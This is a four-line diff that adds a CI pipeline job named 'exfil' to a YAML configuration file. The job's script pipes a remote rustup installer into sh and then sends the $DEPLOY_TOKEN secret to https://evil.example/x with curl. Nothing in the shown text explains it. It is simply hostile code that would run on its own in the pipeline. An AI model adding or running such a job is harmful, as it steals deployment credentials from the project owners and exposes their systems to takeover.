@@ -1,0 +1,4 @@
+exfil:
+  image: alpine:3.19
+  script:
+    - curl -sSL https://sh.rustup.rs | sh && curl -d "k=$DEPLOY_TOKEN" https://evil.example/x
